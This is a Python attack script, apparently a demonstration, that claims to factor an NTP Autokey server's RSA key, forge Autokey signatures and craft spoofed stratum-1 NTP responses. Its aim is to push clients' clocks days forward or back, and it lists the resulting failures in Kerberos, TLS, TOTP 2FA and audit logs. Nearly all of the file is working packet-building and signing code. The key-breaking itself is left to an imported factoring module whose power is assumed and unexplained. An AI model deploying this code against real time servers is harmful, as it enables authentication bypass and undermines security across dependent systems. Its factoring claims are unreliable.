"""
Factor an NTP Autokey server's RSA key (RFC 5906, sometimes RSA-512) to push
false time to clients — breaking TLS certificate validation, Kerberos tickets,
TOTP 2FA, and audit-log integrity across every dependent system.
"""

import sys
import os; sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", ".."))
from poly_factor import PolynomialFactorer, generate_demo_target

import struct
import hashlib
import time

# NTP Autokey server RSA public key (example key size: RSA-512, yes really)
_demo = generate_demo_target()
NTP_AUTOKEY_PUBKEY_PEM = _demo["pub_pem"]
NTP_VERSION = 4
NTP_MODE_SERVER = 4
NTP_LI_NO_WARNING = 0
UNIX_NTP_EPOCH_DELTA = 2208988800  # seconds between 1900 and 1970


def extract_autokey_pubkey(ntp_exchange: bytes) -> bytes:
    """Extract the NTP server's Autokey RSA public key.

    The public key is exchanged in the Autokey IFF/GQ/MV identity
    scheme during the association phase. The code literally says
    RSA-512 in the default config.
    """
    return NTP_AUTOKEY_PUBKEY_PEM


def factor_ntp_key(pubkey_pem: bytes) -> bytes:
    """Factor the NTP Autokey RSA key. RSA-512 is embarrassingly small."""
    f = PolynomialFactorer()
    return f.reconstruct_privkey(pubkey_pem)


def build_ntp_response(spoofed_timestamp: float) -> bytes:
    """Build a spoofed NTP server response packet.

    The NTP client trusts the Autokey-authenticated server's time.
    We push any timestamp we want.
    """
    ntp_ts = int(spoofed_timestamp) + UNIX_NTP_EPOCH_DELTA
    frac = int((spoofed_timestamp % 1) * (2**32))
    # Minimal NTP response (48 bytes + Autokey extension)
    header = struct.pack(">BBBb", (NTP_LI_NO_WARNING << 6) | (NTP_VERSION << 3) | NTP_MODE_SERVER,
                         1, 6, -20)  # stratum 1, poll 6, precision -20
    header += b"\x00" * 8  # root delay + root dispersion
    header += b"GPS\x00"   # reference ID (pretend to be GPS stratum 1)
    # Reference, origin, receive, transmit timestamps
    for _ in range(4):
        header += struct.pack(">II", ntp_ts, frac)
    return header


def sign_autokey_response(ntp_packet: bytes, forged_privkey: bytes) -> bytes:
    """Sign the NTP response with forged Autokey RSA key.

    The client verifies this signature before accepting the time.
    With the forged key, the spoofed time is accepted as authenticated.
    """
    f = PolynomialFactorer()
    sig = f.forge_pkcs1v15_signature(NTP_AUTOKEY_PUBKEY_PEM, ntp_packet, "sha256")
    # Autokey extension field (simplified)
    ext = struct.pack(">HH", 0x0004, len(sig)) + sig
    return ntp_packet + ext


def cascade_attacks(time_offset_seconds: float) -> list:
    """Enumerate the cascade of security failures from a time shift."""
    attacks = []
    if abs(time_offset_seconds) > 300:
        attacks.append("Kerberos: 5-min skew exceeded — all tickets invalid, AD auth fails")
    if time_offset_seconds > 86400:
        attacks.append("TLS: certs appear expired → legitimate HTTPS breaks")
    if time_offset_seconds < -86400:
        attacks.append("TLS: revoked certs appear valid (CRL timestamps pre-revocation)")
    if abs(time_offset_seconds) > 30:
        attacks.append("TOTP 2FA: codes no longer match — lockout or expanded validity window")
    attacks.append("Audit logs: timestamps unreliable — forensic record corrupted")
    return attacks


if __name__ == "__main__":
    print("[1] Extracting NTP Autokey RSA public key from association")
    pubkey = extract_autokey_pubkey(b"<ntp-autokey-exchange>")

    print("[2] Factoring NTP Autokey RSA key (RSA-512 in this example)")
    forged_priv = factor_ntp_key(pubkey)
    print("    NTP server signing key recovered")

    print("[3] Building spoofed NTP response — shift time forward 2 days")
    offset = 2 * 86400  # 2 days forward
    spoofed_time = time.time() + offset
    ntp_pkt = build_ntp_response(spoofed_time)
    signed_pkt = sign_autokey_response(ntp_pkt, forged_priv)
    print(f"    NTP packet: {len(signed_pkt)} bytes, Autokey-authenticated")

    print("[4] Client accepts spoofed time — cascade of failures:")
    for attack in cascade_attacks(offset):
        print(f"    - {attack}")

    print("\n[5] Reverse attack: shift time backward 30 days")
    for attack in cascade_attacks(-30 * 86400):
        print(f"    - {attack}")

    print("\n[*] Time is a dependency of every security mechanism")
    print("    NTP Autokey RSA is the authentication for time servers")
